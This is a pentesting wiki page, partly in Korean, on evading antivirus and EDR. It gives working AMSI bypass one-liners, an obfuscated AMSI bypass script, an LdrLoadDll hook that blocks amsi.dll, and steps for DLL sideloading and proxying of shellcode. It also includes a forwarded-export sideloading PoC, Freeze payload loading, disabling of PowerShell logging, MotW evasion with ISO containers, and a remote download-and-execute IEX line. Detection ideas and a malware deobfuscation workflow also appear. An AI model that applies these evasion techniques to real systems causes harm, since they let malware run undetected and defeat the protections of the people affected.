# Antivirus (AV) 우회

{{#include ../banners/hacktricks-training.md}}

**이 페이지는** [**@m2rc_p**](https://twitter.com/m2rc_p)**님이 작성했습니다!**

## Defender 중지

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender가 작동하지 않도록 하는 도구.
- [no-defender](https://github.com/es3n1n/no-defender): 다른 AV를 가장하여 Windows Defender가 작동하지 않도록 하는 도구.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

현재 AV는 파일이 악성인지 여부를 확인하기 위해 정적 탐지, 동적 분석, 그리고 더 발전된 EDR의 경우 행위 분석을 사용합니다.

### **Static detection**

정적 탐지는 바이너리나 스크립트 내의 알려진 악성 문자열이나 바이트 배열을 플래그하거나 파일 자체에서 정보를 추출하는 방식(e.g. file description, company name, digital signatures, icon, checksum 등)으로 이루어집니다. 즉, 공개적으로 알려진 도구를 사용하면 더 쉽게 감지될 수 있는데, 이미 분석되어 악성으로 표시되었을 가능성이 높기 때문입니다. 이러한 탐지를 회피하는 방법은 몇 가지가 있습니다:

- **Encryption**

바이너리를 암호화하면 AV가 프로그램을 감지할 방법이 없지만, 메모리에서 복호화하고 실행할 수 있는 로더가 필요합니다.

- **Obfuscation**

때로는 바이너리나 스크립트의 일부 문자열만 변경해도 AV를 통과할 수 있지만, 무엇을 난독화하느냐에 따라 시간이 많이 들 수 있습니다.

- **Custom tooling**

자체 도구를 개발하면 알려진 악성 시그니처가 없겠지만, 많은 시간과 노력이 필요합니다.

> [!TIP]
> Windows Defender의 정적 탐지에 대해 확인하는 좋은 방법은 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)입니다. 이 도구는 파일을 여러 세그먼트로 나누고 각 세그먼트를 개별적으로 Defender에 스캔하도록 요청하여, 바이너리에서 정확히 어떤 문자열이나 바이트가 플래그되는지 알려줍니다.

실무적인 AV Evasion에 관한 이 [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)를 꼭 확인해 보시길 권합니다.

### **Dynamic analysis**

동적 분석은 AV가 샌드박스에서 바이너리를 실행하고 악의적 활동(e.g. 브라우저 비밀번호를 복호화해 읽으려 하거나 LSASS의 minidump 수행 등)을 관찰하는 경우입니다. 이 부분은 다루기 까다로울 수 있지만, 샌드박스를 회피하기 위해 사용할 수 있는 몇 가지 방법은 다음과 같습니다.

- **Sleep before execution** 구현 방식에 따라 AV의 동적 분석을 우회하는 훌륭한 방법이 될 수 있습니다. AV는 사용자의 작업 흐름을 방해하지 않기 위해 파일을 검사할 때 매우 짧은 시간이 주어지므로, 긴 sleep을 사용하면 바이너리 분석을 방해할 수 있습니다. 문제는 많은 AV의 샌드박스가 구현 방식에 따라 sleep을 건너뛸 수 있다는 점입니다.
- **Checking machine's resources** 보통 샌드박스는 사용 가능한 리소스가 매우 적습니다(e.g. < 2GB RAM). 그렇지 않으면 사용자의 머신을 느려지게 할 수 있기 때문입니다. 여기서 창의적으로 접근할 수 있습니다 — 예를 들어 CPU 온도나 팬 속도 등을 확인하면 샌드박스에서 구현되지 않은 항목을 확인할 수 있습니다.
- **Machine-specific checks** 대상 사용자가 "contoso.local" 도메인에 가입된 워크스테이션이라면, 컴퓨터의 도메인을 검사하여 지정한 도메인과 일치하지 않으면 프로그램을 종료하도록 할 수 있습니다.

Microsoft Defender의 Sandbox 컴퓨터 이름이 HAL9TH인 것으로 알려져 있으므로, 악성코드 실행 전에 컴퓨터 이름을 확인하여 HAL9TH이면 Defender의 샌드박스 내부에 있다는 뜻이므로 프로그램을 종료하도록 할 수 있습니다.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>출처: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

샌드박스를 상대로 한 몇 가지 훌륭한 팁은 [@mgeeky](https://twitter.com/mariuszbit)로부터 확인해 보세요.

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

앞서 말했듯이, **public tools**은 결국 **감지될** 가능성이 높습니다. 스스로에게 물어보세요:

예를 들어, LSASS를 덤프하려고 한다면, **정말로 mimikatz를 사용해야 하나요**? 아니면 덜 알려진 다른 프로젝트를 사용하여 LSASS를 덤프할 수 있지 않을까요.

정답은 후자일 가능성이 큽니다. 예를 들어 mimikatz는 아마도 AV 및 EDR에 의해 가장 많이 플래그되는 도구 중 하나일 것입니다. 프로젝트 자체는 훌륭하지만, AV를 우회하기 위해 다루기에는 악몽에 가깝습니다. 따라서 달성하려는 목표에 맞는 대체 도구를 찾아보세요.

> [!TIP]
> 회피를 위해 페이로드를 수정할 때는 Defender의 자동 샘플 제출(automatic sample submission)을 끄고, 장기적인 회피가 목표라면 **제발, 진심으로, DO NOT UPLOAD TO VIRUSTOTAL** 하세요. 특정 AV에서 페이로드가 감지되는지 확인하려면 VM에 해당 AV를 설치하고 자동 샘플 제출을 끈 뒤 그 환경에서 테스트해 만족할 때까지 조정하세요.

## EXEs vs DLLs

가능하면 항상 **evade 목적으로 DLL 사용을 우선**하세요. 제 경험상 DLL 파일은 보통 **감지율이 훨씬 낮고** 분석도 덜 되는 경향이 있어(물론 페이로드가 DLL로 실행될 방법이 있어야 합니다) 일부 경우 감지를 피하는 간단한 트릭이 됩니다.

다음 이미지에서 볼 수 있듯이, Havoc의 DLL 페이로드는 antiscan.me에서 4/26의 감지율을 보인 반면 EXE 페이로드는 7/26의 감지율을 보였습니다.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me에서 일반 Havoc EXE 페이로드와 일반 Havoc DLL 비교</p></figcaption></figure>

이제 DLL 파일을 사용해 훨씬 더 은밀하게 만들기 위해 사용할 수 있는 몇 가지 트릭을 보여드리겠습니다.

## DLL Sideloading & Proxying

**DLL Sideloading**은 victim application과 악성 payload를 서로 나란히 위치시키는 방식으로 loader가 사용하는 DLL 검색 순서를 악용합니다.

취약한 프로그램을 찾으려면 [Siofra](https://github.com/Cybereason/siofra)와 다음 powershell script를 사용해 확인할 수 있습니다:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
This command will output the list of programs susceptible to DLL hijacking inside "C:\Program Files\\" and the DLL files they try to load.

이 명령은 "C:\Program Files\\" 내부에서 DLL hijacking에 취약한 프로그램 목록과 이들이 로드하려는 DLL 파일들을 출력합니다.

I highly recommend you **explore DLL Hijackable/Sideloadable programs yourself**, this technique is pretty stealthy done properly, but if you use publicly known DLL Sideloadable programs, you may get caught easily.

이 기술은 제대로 수행하면 상당히 은밀하지만, 공개적으로 알려진 DLL Sideloadable 프로그램을 사용할 경우 쉽게 발각될 수 있으므로, **DLL Hijackable/Sideloadable 프로그램을 직접 탐색해 보시길** 강력히 권합니다.

Just by placing a malicious DLL with the name a program expects to load, won't load your payload, as the program expects some specific functions inside that DLL, to fix this issue, we'll use another technique called **DLL Proxying/Forwarding**.

프로그램이 로드할 것으로 예상하는 이름의 malicious DLL을 단순히 배치하는 것만으로는 payload가 실행되지 않습니다. 프로그램이 해당 DLL 안에 특정 함수들을 기대하기 때문입니다. 이 문제를 해결하기 위해 **DLL Proxying/Forwarding**이라는 다른 기법을 사용하겠습니다.

**DLL Proxying** forwards the calls a program makes from the proxy (and malicious) DLL to the original DLL, thus preserving the program's functionality and being able to handle the execution of your payload.

**DLL Proxying**은 프로그램이 proxy (and malicious) DLL에 대해 하는 호출을 원래 DLL로 전달하여 프로그램의 기능을 유지하면서 payload 실행을 처리할 수 있게 합니다.

I will be using the [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project from [@flangvik](https://twitter.com/Flangvik/)

저는 [@flangvik](https://twitter.com/Flangvik/)의 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 프로젝트를 사용할 것입니다.

These are the steps I followed:

제가 수행한 단계는 다음과 같습니다:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
마지막 명령은 우리에게 2개의 파일을 생성합니다: DLL 소스 코드 템플릿과 원본 이름이 변경된 DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> I **강력히 권합니다** you watch [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) about DLL Sideloading and also [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) to learn more about what we've discussed more in-depth.

### Forwarded Exports 악용 (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- `TargetDll`이 아직 로드되지 않았으면 로드한다
- 그 안에서 `TargetFunc`를 해결한다

이해해야 할 주요 동작:
- If `TargetDll` is a KnownDLL, it is supplied from the protected KnownDLLs namespace (e.g., ntdll, kernelbase, ole32).
- If `TargetDll` is not a KnownDLL, the normal DLL search order is used, which includes the directory of the module that is doing the forward resolution.

이를 통해 간접적인 sideloading primitive가 가능해집니다: 함수가 non-KnownDLL 모듈 이름으로 포워딩되는 signed DLL을 찾은 다음, 해당 signed DLL과 동일한 디렉터리에 포워딩 대상 모듈 이름과 정확히 일치하는 attacker-controlled DLL을 배치합니다. 포워딩된 export가 호출되면, 로더는 포워드를 해결하고 동일한 디렉터리에서 당신의 DLL을 로드하여 DllMain을 실행합니다.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll`은 KnownDLL이 아니므로 일반 검색 순서로 해결됩니다.

PoC (copy-paste):
1) 서명된 시스템 DLL을 쓰기 가능한 폴더로 복사
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 같은 폴더에 악성 `NCRYPTPROV.dll`을(를) 배치하세요. 최소한의 DllMain만으로 코드 실행이 가능하며; DllMain을 트리거하기 위해 forwarded function을 구현할 필요는 없습니다.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 서명된 LOLBin으로 포워딩을 트리거:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (서명됨)이 side-by-side `keyiso.dll` (서명됨)을 로드합니다
- `KeyIsoSetAuditingInterface`를 해석하는 동안, 로더는 forward를 따라 `NCRYPTPROV.SetAuditingInterface`로 이동합니다
- 그 다음 로더는 `C:\test`에서 `NCRYPTPROV.dll`을 로드하고 그 `DllMain`을 실행합니다
- 만약 `SetAuditingInterface`가 구현되어 있지 않다면, `DllMain`이 이미 실행된 이후에야 "missing API" 오류가 발생합니다

Hunting tips:
- 대상 모듈이 KnownDLL이 아닌 forwarded exports에 집중하세요. KnownDLLs는 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` 아래에 나열됩니다.
- 다음과 같은 도구로 forwarded exports를 열거할 수 있습니다:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 후보를 찾기 위해 Windows 11 forwarder 인벤토리를 확인하세요: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Monitor LOLBins (e.g., rundll32.exe) loading signed DLLs from non-system paths, followed by loading non-KnownDLLs with the same base name from that directory
- Alert on process/module chains like: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` under user-writable paths
- Enforce code integrity policies (WDAC/AppLocker) and deny write+execute in application directories

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze는 suspended processes, direct syscalls, alternative execution methods을 사용해 EDRs를 우회하기 위한 payload toolkit입니다`

Freeze를 사용해 shellcode를 은밀하게 로드하고 실행할 수 있습니다.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 우회는 단순한 쫓고 쫓기는 게임입니다. 오늘 통하는 방법이 내일에는 탐지될 수 있으므로 한 가지 도구에만 의존하지 말고, 가능하면 여러 우회 기법을 연쇄적으로 사용하세요.

## AMSI (Anti-Malware Scan Interface)

AMSI는 "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"를 방지하기 위해 만들어졌다. 초기에는 AV가 **디스크상의 파일**만 스캔할 수 있었기 때문에, 페이로드를 **메모리에서 직접** 실행할 수 있다면 AV는 이를 막을 수 없었다 — 충분한 가시성이 없었기 때문이다.

AMSI 기능은 Windows의 다음 구성요소에 통합되어 있다.

- User Account Control, or UAC (EXE, COM, MSI 또는 ActiveX 설치의 권한 상승)
- PowerShell (스크립트, 대화형 사용 및 동적 코드 평가)
- Windows Script Host (wscript.exe 및 cscript.exe)
- JavaScript 및 VBScript
- Office VBA 매크로

AMSI는 스크립트 내용을 암호화/난독화되지 않은 형태로 노출하여 안티바이러스가 스크립트 동작을 검사할 수 있게 한다.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`를 실행하면 Windows Defender에서 다음과 같은 경고가 발생한다.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

앞에 `amsi:`가 붙고 그 뒤에 스크립트를 실행한 실행 파일의 경로(이 경우 powershell.exe)가 오는 것을 확인할 수 있다.

파일을 디스크에 기록하지 않았음에도 AMSI 때문에 메모리 상에서 탐지되었다.

또한, **.NET 4.8**부터는 C# 코드도 AMSI를 통해 실행된다. 이는 `Assembly.Load(byte[])`와 같은 메모리 로드에도 영향을 준다. 따라서 AMSI를 회피하려면 메모리 실행을 위해 .NET의 낮은 버전(예: 4.7.2 이하) 사용을 권장한다.

AMSI를 우회하는 방법은 몇 가지가 있다:

- **Obfuscation**

  AMSI가 주로 정적 탐지로 동작하므로 로드하려는 스크립트를 변경하는 것이 탐지를 피하는 데 도움이 될 수 있다.

  하지만 AMSI는 여러 단계로 난독화된 스크립트도 복원할 수 있는 기능을 가지므로, 난독화는 어떻게 되느냐에 따라 오히려 좋지 않은 선택이 될 수 있다. 따라서 우회가 간단하지 않을 수 있다. 때로는 변수명 몇 개만 바꿔도 통과되는 경우도 있으므로, 탐지 정도에 따라 다르다.

- **AMSI Bypass**

  AMSI는 DLL을 powershell(또는 cscript.exe, wscript.exe 등) 프로세스에 로드하는 방식으로 구현되어 있어, 권한이 없는 사용자로 실행 중이라도 이를 쉽게 조작할 수 있다. 이런 구현상의 결함 때문에 연구자들은 AMSI 스캐닝을 회피하는 여러 방법을 발견했다.

  **Forcing an Error**

  AMSI 초기화가 실패하도록 강제(amsiInitFailed)하면 현재 프로세스에 대해 스캔이 시작되지 않는다. 원래 이 기법은 [Matt Graeber](https://twitter.com/mattifestation)가 공개했으며 Microsoft는 이러한 광범위한 사용을 막기 위한 시그니처를 개발했다.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
AMSI를 현재 powershell 프로세스에서 사용할 수 없게 만드는 데는 powershell 코드 한 줄이면 충분했습니다. 물론 이 한 줄은 AMSI 자체에 의해 탐지되었으므로 이 기술을 사용하려면 약간의 수정이 필요합니다.

다음은 제가 이 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)에서 가져온 수정된 AMSI bypass입니다.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

이 기술은 처음에 [@RastaMouse](https://twitter.com/_RastaMouse/)에 의해 발견되었으며, amsi.dll의 "AmsiScanBuffer" 함수 주소를 찾아 사용자가 제공한 입력을 스캔하는 해당 함수를 E_INVALIDARG 코드를 반환하도록 덮어쓰는 방식입니다. 이렇게 하면 실제 스캔 결과가 0을 반환하게 되고, 이는 클린한 결과로 해석됩니다.

> [!TIP]
> 자세한 설명은 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)을(를) 읽어보십시오.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### AMSI 차단: amsi.dll 로드 방지 (LdrLoadDll hook)

AMSI는 `amsi.dll`이 현재 프로세스에 로드된 후에만 초기화됩니다. 언어에 구애받지 않는 견고한 우회 방법은 요청된 모듈이 `amsi.dll`일 때 오류를 반환하도록 `ntdll!LdrLoadDll`에 사용자 모드 후크를 설치하는 것입니다. 그 결과 AMSI는 로드되지 않으며 해당 프로세스에 대해 스캔이 전혀 수행되지 않습니다.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
참고
- PowerShell, WScript/CScript 및 custom loaders 전반에서 동작합니다 (AMSI를 로드하는 모든 경우에 해당).
- 긴 명령줄 흔적을 피하기 위해 stdin으로 스크립트를 공급하는 방식(`PowerShell.exe -NoProfile -NonInteractive -Command -`)과 함께 사용하세요.
- LOLBins을 통해 실행되는 loaders(예: `regsvr32`가 `DllRegisterServer`를 호출하는 경우)에서 사용되는 것이 관찰되었습니다.

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**탐지된 시그니처 제거**

다음과 같은 도구들 **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 및 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** 을 사용하여 현재 프로세스의 메모리에서 탐지된 AMSI 시그니처를 제거할 수 있습니다. 이 도구들은 현재 프로세스의 메모리를 스캔해 AMSI 시그니처를 찾고 NOP 명령으로 덮어써 메모리에서 실질적으로 제거합니다.

**AMSI를 사용하는 AV/EDR 제품**

AMSI를 사용하는 AV/EDR 제품 목록은 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** 에서 확인할 수 있습니다.

**PowerShell 버전 2 사용**
PowerShell 버전 2를 사용하면 AMSI가 로드되지 않으므로 스크립트가 AMSI로 스캔되지 않은 채 실행됩니다. 다음과 같이 실행할 수 있습니다:
```bash
powershell.exe -version 2
```
## PS 로깅

PowerShell logging은 시스템에서 실행된 모든 PowerShell 명령을 기록할 수 있게 해주는 기능입니다. 이는 감사 및 문제 해결에 유용하지만, 탐지를 회피하려는 공격자에게는 **문제가 될 수 있습니다**.

PowerShell 로깅을 우회하려면 다음 기술을 사용할 수 있습니다:

- **Disable PowerShell Transcription and Module Logging**: 이 목적을 위해 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) 같은 도구를 사용할 수 있습니다.
- **Use Powershell version 2**: PowerShell version 2를 사용하면 AMSI가 로드되지 않아 AMSI의 스캔 없이 스크립트를 실행할 수 있습니다. 이렇게 실행하세요: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) 를 사용해 방어가 없는 PowerShell 세션을 생성하세요 (이는 Cobal Strike의 `powerpick`이 사용하는 방식입니다).


## 난독화

> [!TIP]
> 여러 난독화 기법은 데이터를 암호화하는 데 의존하는데, 이는 바이너리의 엔트로피를 증가시켜 AV와 EDR이 탐지하기 쉬워집니다. 이 점을 주의하고, 민감하거나 숨겨야 할 코드의 특정 섹션에만 암호화를 적용하는 것을 권장합니다.

### ConfuserEx로 보호된 .NET 바이너리의 난독화 해제

ConfuserEx 2(또는 상업적 포크)를 사용하는 악성코드를 분석할 때, 디컴파일러와 샌드박스를 차단하는 여러 보호 계층을 마주하는 일이 흔합니다. 아래 워크플로우는 이후 dnSpy나 ILSpy 같은 도구로 C#으로 디컴파일할 수 있는 거의 원본에 가까운 IL을 안정적으로 **복원합니다**.

1.  안티탬퍼 제거 – ConfuserEx는 모든 *메서드 본문*을 암호화하고 *모듈* 정적 생성자 (`<Module>.cctor`) 내부에서 복호화합니다. 또한 PE 체크섬을 패치하므로 수정하면 바이너리가 충돌합니다. 암호화된 메타데이터 테이블을 찾고 XOR 키를 복구하여 깨끗한 어셈블리를 다시 쓰려면 **AntiTamperKiller**를 사용하세요:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
출력에는 자체 언패커를 만들 때 유용한 6개의 안티탬퍼 매개변수 (`key0-key3`, `nameHash`, `internKey`)가 포함됩니다.

2.  심볼 / 제어 흐름 복구 – *clean* 파일을 ConfuserEx를 인식하는 포크인 **de4dot-cex**에 넣습니다:
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
플래그:
• `-p crx` – ConfuserEx 2 프로파일 선택  
• de4dot는 제어 흐름 평탄화(control-flow flattening)를 되돌리고 원래의 네임스페이스, 클래스 및 변수 이름을 복원하며 상수 문자열을 복호화합니다.

3.  프록시 호출 제거 – ConfuserEx는 디컴파일을 더욱 방해하기 위해 직접 메서드 호출을 경량의 래퍼(일명 *proxy calls*)로 대체합니다. 이를 제거하려면 **ProxyCall-Remover**를 사용하세요:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
이 단계 후에는 불투명한 래퍼 함수(`Class8.smethod_10`, …) 대신 `Convert.FromBase64String`나 `AES.Create()` 같은 일반적인 .NET API가 보일 것입니다.

4.  수동 정리 – 결과 바이너리를 dnSpy로 열어 대형 Base64 블롭이나 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 사용을 검색해 *실제* 페이로드를 찾아보세요. 종종 악성 코드는 이를 `<Module>.byte_0` 내부에 초기화된 TLV 인코딩 바이트 배열로 저장합니다.

위의 절차는 악성 샘플을 **실행하지 않고도** 실행 흐름을 복원하므로 오프라인 워크스테이션에서 작업할 때 유용합니다.

> 🛈  ConfuserEx는 `ConfusedByAttribute`라는 커스텀 어트리뷰트를 생성합니다. 이는 샘플을 자동으로 분류(triage)할 때 IOC로 사용할 수 있습니다.

#### 원라이너
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 이 프로젝트의 목적은 [LLVM](http://www.llvm.org/) 컴파일 스위트의 오픈 소스 포크를 제공하여, code obfuscation 및 무결성 보호를 통해 소프트웨어 보안을 향상시키는 것입니다.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator는 `C++11/14` 언어를 사용하여 컴파일 시점에 외부 도구나 컴파일러 수정을 사용하지 않고 obfuscated code를 생성하는 방법을 보여줍니다.
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework가 생성한 obfuscated operations 레이어를 추가하여 애플리케이션을 분석하려는 사람의 작업을 조금 더 어렵게 만듭니다.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz는 x64 binary obfuscator로 .exe, .dll, .sys 등을 포함한 다양한 pe files를 obfuscate할 수 있습니다.
- [**metame**](https://github.com/a0rtega/metame): Metame은 임의 실행 파일을 위한 단순한 metamorphic code engine입니다.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator는 ROP (return-oriented programming)를 사용하여 LLVM-supported languages를 위한 세분화된 code obfuscation 프레임워크입니다. ROPfuscator는 일반 명령어를 ROP chains로 변환하여 어셈블리 코드 수준에서 프로그램을 obfuscate함으로써 정상적인 제어 흐름에 대한 우리의 직관을 저해합니다.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt는 Nim으로 작성된 .NET PE Crypter입니다.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor는 기존 EXE/DLL을 shellcode로 변환한 다음 이를 로드할 수 있습니다

## SmartScreen & MoTW

인터넷에서 일부 실행 파일을 다운로드하여 실행할 때 이 화면을 본 적이 있을 것입니다.

Microsoft Defender SmartScreen은 잠재적으로 악성인 애플리케이션 실행으로부터 최종 사용자를 보호하기 위한 보안 메커니즘입니다.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen은 주로 평판 기반 접근 방식으로 작동합니다. 즉, 일반적이지 않은 다운로드된 애플리케이션은 SmartScreen을 트리거하여 파일 실행을 경고하고 차단합니다(하지만 파일은 여전히 More Info -> Run anyway를 클릭하면 실행될 수 있습니다).

**MoTW** (Mark of The Web)는 다운로드 시 자동으로 생성되는 Zone.Identifier라는 이름의 [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)으로, 다운로드된 URL 정보를 포함합니다.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>인터넷에서 다운로드한 파일의 Zone.Identifier ADS를 확인하는 중.</p></figcaption></figure>

> [!TIP]
> 실행 파일이 **trusted** signing certificate로 서명된 경우 **won't trigger SmartScreen** 한다는 점을 명심하세요.

payloads에 Mark of The Web가 붙는 것을 방지하는 매우 효과적인 방법 중 하나는 ISO와 같은 컨테이너 안에 패키징하는 것입니다. 이는 Mark-of-the-Web (MOTW)이 **non NTFS** 볼륨에는 적용될 수 없기 때문입니다.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)는 payloads를 output containers로 패키징하여 Mark-of-the-Web을 회피하는 도구입니다.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
